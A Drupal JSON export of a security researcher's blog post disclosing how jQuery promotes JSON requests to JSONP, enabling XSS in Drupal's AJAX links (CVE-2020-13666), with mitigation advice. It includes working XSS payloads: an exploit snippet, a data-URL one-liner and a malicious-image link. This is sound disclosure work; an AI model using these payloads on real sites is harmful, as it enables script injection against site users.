{
    "uuid": [
        {
            "value": "a16e604c-4018-4c71-af22-d448f468964d"
        }
    ],
    "langcode": [
        {
            "value": "en"
        }
    ],
    "type": [
        {
            "target_id": "blog",
            "target_type": "node_type",
            "target_uuid": "a90c00e7-fd49-42a6-8cdb-e99ec16f7742"
        }
    ],
    "revision_timestamp": [
        {
            "value": "2020-11-19T14:49:32+00:00",
            "format": "Y-m-d\\TH:i:sP"
        }
    ],
    "revision_uid": [
        {
            "target_type": "user",
            "target_uuid": "30bffdc0-96b3-4656-9078-3f8113359c60"
        }
    ],
    "revision_log": [],
    "status": [
        {
            "value": true
        }
    ],
    "uid": [
        {
            "target_type": "user",
            "target_uuid": "30bffdc0-96b3-4656-9078-3f8113359c60"
        }
    ],
    "title": [
        {
            "value": "Promoting jQuery JSON to JSONP to trigger XSS"
        }
    ],
    "created": [
        {
            "value": "2020-11-19T15:17:08+00:00",
            "format": "Y-m-d\\TH:i:sP"
        }
    ],
    "changed": [
        {
            "value": "2020-11-19T14:49:32+00:00",
            "format": "Y-m-d\\TH:i:sP"
        }
    ],
    "promote": [
        {
            "value": true
        }
    ],
    "sticky": [
        {
            "value": false
        }
    ],
    "default_langcode": [
        {
            "value": true
        }
    ],
    "revision_translation_affected": [
        {
            "value": true
        }
    ],
    "path": [
        {
            "alias": "\/blog\/promoting-jquery-json-jsonp-trigger-xss",
            "langcode": "en",
            "pathauto": 1
        }
    ],
    "body": [
        {
            "value": "<p>I\u2019ve done quite a bit of security research for Drupal, and one area of exploitation that I often come back to is the AJAX API. Drupal\u2019s AJAX API is built on top of jQuery, and lets developers easily add interactive behavior to the frontend.<\/p>\r\n\r\n<p>One method of enabling this functionality is to add the \u201c<span class=\"monospace\">use-ajax<\/span>\u201d class to clickable HTML elements. For example, in a previous blog post \u201c<a href=\"https:\/\/mortenson.coffee\/blog\/getting-creative-drupal-xss\">Getting creative with Drupal XSS<\/a>\u201d I found that you could trigger XSS by pointing one of these elements to an external site:<\/p>\r\n\r\n<p><code>&lt;a href=\"http:\/\/mynastysite.com\/xss.php\" class=\"use-ajax\"&gt;Click me!&lt;\/a&gt;<\/code><\/p>\r\n\r\n<p>This has since been fixed to only allow local URLs, but I kept wondering - can this be exploitable?<\/p>\r\n\r\n<p><code>&lt;a href=\"https:\/\/safedomain.com\/&lt;payload&gt;\" class=\"use-ajax\"&gt;Click me!&lt;\/a&gt;<\/code><\/p>\r\n\r\n<p>Or at a lower level, is this exploitable?<\/p>\r\n\r\n<p><code>$.ajax(\"&lt;payload&gt;\u201d, {dataType: \"json\"})<\/code><\/p>\r\n\r\n<p>The answer was, surprisingly, yes. You can trigger XSS by only controlling the AJAX URL, or in some cases just the tail end of the URL, regardless of the caller.<\/p>\r\n\r\n<p>To explain this, let\u2019s read the documentation for jQuery.ajax():<\/p>\r\n\r\n<blockquote>\r\n<p>dataType (default: Intelligent Guess (xml, json, script, or html))<br \/>\r\nType: String<br \/>\r\nThe type of data that you're expecting back from the server.<br \/>\r\n[...]<br \/>\r\n\"json\": Evaluates the response as JSON and returns a JavaScript object. <strong>Cross-domain \"json\" requests that have a callback placeholder, e.g. ?callback=?, are performed using JSONP unless the request includes jsonp: false<\/strong> in its request options. [...]<\/p>\r\n<\/blockquote>\r\n\r\n<p>This was an interesting find for me - to summarize, if you make an AJAX request with the dataType set to \u201c<span class=\"monospace\">json<\/span>\u201d, but the URL includes \u201c<span class=\"monospace\">?callback=?<\/span>\u201d, the response is treated like JSONP. For those that are unaware, JSONP responses are executed as JavaScript, which means that if you control part of a jQuery AJAX URL and the response, you can trigger XSS. This is true for all up to date versions of jQuery except 4.x which changed the behavior in <a href=\"https:\/\/github.com\/jquery\/jquery\/issues\/3376\">https:\/\/github.com\/jquery\/jquery\/issues\/3376<\/a>.<\/p>\r\n\r\n<p>Here\u2019s what an exploit might look like:<\/p>\r\n\r\n<p><code>&lt;script src=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/jquery\/1.12.4\/jquery.min.js\"&gt;&lt;\/script&gt;<br \/>\r\n&lt;script&gt;<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;$.ajax(\"\/payload.json?callback=?\", {<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dataType: \"json\",<br \/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;});<br \/>\r\n&lt;\/script&gt;<\/code><\/p>\r\n\r\n<p>Or as a portable&nbsp;one-liner:<\/p>\r\n\r\n<p><code>jQuery.ajax(\"data:;,alert('@mortensonsam')\/\/?callback=?\", {\"dataType\": \"json\"})<\/code><\/p>\r\n\r\n<p>You may be thinking \u201cWhen will I ever get to control the URL?\u201d, but it happens! Think of any web application that fetches (normally safe) JSON from an external URL. There may be more uses for this than you assume.<\/p>\r\n\r\n<p>Let\u2019s bring it back to Drupal - as I mentioned before, the magic in the \u201c<span class=\"monospace\">use-ajax<\/span>\u201d class only applies to local URLs now, and for this exploit to work you need to control the response data. What kind of responses do lower privileged users control? Images! For this exploit, a path like \u201c<span class=\"monospace\">\/payload.gif?callback=?<\/span>\u201d will work just as well as \u201c<span class=\"monospace\">\/payload.json?callback=?<\/span>\u201d.<\/p>\r\n\r\n<p>I won\u2019t give you the full tutorial for embedding JavaScript into images, but if I recall correctly I used this tool for the task <a href=\"https:\/\/github.com\/jklmnn\/imagejs\">https:\/\/github.com\/jklmnn\/imagejs<\/a>.<\/p>\r\n\r\n<p>Once a user could upload a malicious image, they could then put in some HTML like this:<\/p>\r\n\r\n<p><code>&lt;a href=\"http:\/\/safesite.com\/sites\/default\/files\/payload.gif?callback=?\" class=\"use-ajax\"&gt;Click me!&lt;\/a&gt;<\/code><\/p>\r\n\r\n<p>To trigger XSS. It\u2019s worth noting that the scope of this wasn\u2019t all encompassing - every Drupal 6, 7, and 8 site needed updating, but not every configuration of those sites were affected. Drupal 8 in particular was hardened by default against this since it doesn\u2019t allow arbitrary classes to be added to links.<\/p>\r\n\r\n<p>So - how do you mitigate something like this? Per the jQuery docs quoted above, adding \u201c<span class=\"monospace\">jsonp: false<\/span>\u201d to your AJAX settings should do the trick. For example, this code should be safe:<\/p>\r\n\r\n<p><code>$.ajax(\"&lt;payload&gt;\", {dataType: \"json\", jsonp: false})<\/code><\/p>\r\n\r\n<p>However, earlier versions of jQuery 1.x did not support the \u201cjsonp\u201d setting, so we had to filter every URL passed to $.ajax to strip anything that would trigger JSON to JSONP promotion (specifically anything matching the regex <span class=\"monospace\">\/\\=\\?(&amp;|$)\/<\/span>). You can see the full fix for older jQuery versions here: <a href=\"https:\/\/git.drupalcode.org\/project\/drupal\/-\/blob\/7.x\/misc\/drupal.js#L436-441\">https:\/\/git.drupalcode.org\/project\/drupal\/-\/blob\/7.x\/misc\/drupal.js#L436-441<\/a>.<\/p>\r\n\r\n<p>So, if you\u2019re using jQuery and letting users provide AJAX URLs, make sure you\u2019re up to date and passing the \u201c<span class=\"monospace\">jsonp: false<\/span>\u201d setting through!<\/p>\r\n\r\n<p>Drupal released a fix in SA-CORE-2020-007 (CVE-2020-13666), which you can read about here: <a href=\"https:\/\/www.drupal.org\/sa-core-2020-007\">https:\/\/www.drupal.org\/sa-core-2020-007<\/a>. Thanks to everyone who helped fix this bug!<\/p>\r\n",
            "format": "full_html",
            "summary": ""
        }
    ],
    "field_tags": [
        {
            "target_type": "taxonomy_term",
            "target_uuid": "d9871794-7262-415a-a18e-fc784794b1c9"
        },
        {
            "target_type": "taxonomy_term",
            "target_uuid": "e30b1fff-0abe-4d0d-9ea9-6d81ed242109"
        }
    ]
}